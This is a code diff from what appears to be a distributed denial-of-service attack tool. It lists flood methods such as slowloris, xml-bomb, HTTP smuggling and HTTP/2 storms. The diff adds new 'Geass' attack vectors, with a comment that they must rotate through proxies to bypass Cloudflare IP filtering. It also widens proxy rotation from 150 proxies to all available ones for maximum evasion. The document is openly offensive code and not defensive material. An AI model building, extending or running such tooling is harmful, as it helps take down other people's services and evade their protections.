@@ -267,6 +267,9 @@ const HTTP_PROXY_METHODS = new Set([
   "slow-read", "range-flood", "xml-bomb", "h2-ping-storm",
   "http-smuggling", "doh-flood", "keepalive-exhaust",
   "app-smart-flood", "large-header-bomb", "http2-priority-storm",
+  // Geass vectors — must rotate via proxy to bypass Cloudflare IP filtering
+  "geass-override", "cf-bypass", "nginx-killer", "h2-rst-burst",
+  "h2-storm", "pipeline-flood", "conn-flood", "slowloris",
 ]);
 
 function spawnPool(
@@ -276,9 +279,9 @@ function spawnPool(
   const threadsPerWorker = Math.max(1, Math.floor(threads / numWorkers));
   const workers: Worker[] = [];
   const workerConns = new Array<number>(numWorkers).fill(0);
-  // Pass top 150 fastest proxies (HTTP + SOCKS5) to workers for rotation
+  // Pass ALL fastest proxies (HTTP + SOCKS5) to workers for maximum IP rotation
   const proxies = HTTP_PROXY_METHODS.has(method) && proxyCache.length > 0
-    ? proxyCache.slice(0, 150).map(p => ({ host: p.host, port: p.port, type: p.type as "http" | "socks5" | undefined }))
+    ? proxyCache.map(p => ({ host: p.host, port: p.port, type: p.type as "http" | "socks5" | undefined }))
     : [];
 
   return new Promise<void>((resolve) => {
